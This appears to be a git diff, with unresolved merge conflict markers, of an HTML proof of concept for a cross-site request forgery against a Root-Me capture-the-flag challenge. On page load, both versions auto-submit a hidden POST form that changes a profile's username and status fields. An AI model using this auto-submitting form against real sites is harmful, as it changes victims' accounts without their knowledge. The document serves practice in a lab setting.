@@ -3,10 +3,17 @@
     <head>
         <title>csrf</title>
     </head>
+<<<<<<< HEAD
  <body></body>
     <form id="form" action='http://challenge01.root-me.org/web-client/ch22/index.php?action=profile' method='POST'>
     <input type="text" name="username" value="yolo">
     <input type="checkbox" name="status" checked >
+=======
+ <body onload="document.frames[0].submit()">
+    <form action='http://challenge01.root-me.org/web-client/ch22/index.php?action=profile' method="POST">
+    <input name="username" value="test">
+    <input name="status" value="status" checked>
+>>>>>>> f0660c9b55e2dee327cce44743e4a5c906e07104
  </form>
  <script>document.getElementById("form").submit()</script>
  </body>
